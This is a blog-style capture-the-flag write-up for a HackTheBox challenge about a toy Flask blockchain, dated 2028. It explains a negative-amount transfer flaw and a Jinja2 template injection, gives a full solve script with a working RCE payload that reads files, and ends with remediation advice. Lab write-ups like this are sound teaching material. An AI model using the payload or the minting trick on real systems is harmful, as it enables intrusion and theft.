---
layout: post
title: "Chainsmoker"
date: 2028-03-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, blockchain, ssti, jinja2, business-logic, rce]
description: "A toy Flask blockchain with two chained bugs: an unchecked negative transaction amount mints unlimited coins, and the 'big player' bot re-renders your transaction data through Jinja2 — a server-side template injection that reads the flag off disk."
---

## Overview

Chainsmoker is a Medium Misc challenge dressed up as a cryptocurrency. It ships a
Python CLI and the server-side `Models/` for a home-grown Flask "blockchain", and the
flag sits at `/app/flag.txt`. The path to it is two chained bugs: first mint yourself
unlimited coins with a **negative-amount transfer**, then abuse a **server-side template
injection** in a bot's echo feature to run a command and read the flag.

## The technique

The service tracks balances as plain signed integers. A transfer just does
`sender -= amount; recipient += amount`, and the only sanity check is a solvency guard
`get_balance(sender) < amount` — which a **negative** amount sails straight through
(`0 < -100000000` is false). Sending a transaction *from* yourself with a negative amount
runs `sender -= (-100000000)`, so your own balance jumps by 100 million. The desktop CLI
tries to block negatives with `amount.isdigit()`, but that guard is client-side only —
you POST the negative value directly to the API.

Why bother getting rich? A server-side **bot** — a "big player" whose public key ships in
`bot_wallet.txt` — only responds to transfers larger than 1,000,000 coins. When it does,
it thanks you by posting a new transaction whose `data` field is your transaction's `data`
**rendered through Jinja2**. That is a textbook [server-side template
injection](https://cwe.mitre.org/data/definitions/1336.html): send `{{7*7}}` and it comes
back as `49`. From there it is one Jinja2 gadget to command execution and the flag. Because
the sink is *stored* data re-rendered by a *different* actor, the RCE output arrives
asynchronously — you read it back off the chain on the next poll, not in your HTTP
response.

## Solution

The durable artifact reuses the challenge's own `Models` so the signature `repr` and the
proof-of-work string match the server byte-for-byte (a nice trap here: `Block.hash()`
forgets to `return`, so it yields `None` and the PoW string is literally
`f'{last_proof}{proof}None'`). Run it from inside the `challenge/` directory:

Create `solve.py`:

```python
#!/usr/bin/python3
import sys, hashlib, requests
from Models.wallet import Wallet
from Models.transaction import Transaction

URL = f"http://{sys.argv[1]}:{sys.argv[2]}"

def valid_proof(last_proof, proof, last_hash):
    guess = f'{last_proof}{proof}{last_hash}'.encode()
    return hashlib.sha256(guess).hexdigest()[:4] == "0000"

def signed_tx(w, sender, recipient, amount, data=""):
    tx = Transaction(sender, recipient, amount)
    tx.data = data
    tx.sig = hex(w.sign_message(str(tx)))[2:]
    return tx

def send_tx(tx):
    return requests.post(f"{URL}/transactions/new", json={
        "sender": tx.sender, "recipient": tx.recipient, "amount": tx.amount,
        "signature": tx.sig, "data": tx.data})

def mine(w):
    lb = requests.get(f"{URL}/last_block").json()
    proof = 0
    while not valid_proof(lb["proof"], proof, None):   # Block.hash() returns None
        proof += 1
    tx = signed_tx(w, "0", w.address, 1)
    return requests.post(f"{URL}/mine", json={
        "recipient": w.address, "signature": tx.sig, "proof": proof})

w = Wallet()
bot = open("bot_wallet.txt").read().strip()

send_tx(signed_tx(w, w.address, bot, -100000000, "millionaire"))   # bug 1: mint
mine(w)

payload = "{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}"
send_tx(signed_tx(w, w.address, bot, 1000001, payload))            # bug 2: SSTI
mine(w); mine(w)

for block in requests.get(f"{URL}/chain").json()["chain"]:
    for tx in block["transactions"]:
        if "HTB{" in str(tx.get("data", "")):
            print("FLAG:", tx["data"])
```

```bash
python3 solve.py <host> <port>
```

Send the negative-amount transfer to mint coins, mine a block, then send the
`1000001`-coin transfer carrying the Jinja2 payload. The `cycler.__init__.__globals__`
gadget reaches `os` without needing `config` in scope. Mine to include the transaction,
wait for the bot's interval to fire (it mines its own echo response), then walk the chain —
the flag lands in the bot's transaction `data`:

```
FLAG: HTB{...}
```

## Why it worked

The signatures were real, but they only ever proved *who* sent a transaction — never that
the *value* was sane. With no server-side `amount > 0` check, a signed, "authenticated"
transfer became an unlimited mint. And the bot treated attacker-controlled `data` as
template *code* rather than *data*, so `{{ ... }}` escaped to Python and to `os.popen`,
running as the app user with the flag readable on disk.

## Fix / defense

- Reject `amount <= 0` **server-side** on every transfer path — never rely on a UI/CLI
  filter as the control.
- Never render user input as a template. Echo with autoescaping and a *static* template,
  passing the data as a variable (`render_template_string("{{ d }}", d=user_data)`) — never
  concatenate user input into template source. A sandbox (`jinja2.sandbox`) is a weaker
  backstop, not a substitute.
- Sign economically-meaningful, canonical fields and use padded RSA (PSS) rather than
  textbook `pow(h, d, n)`.
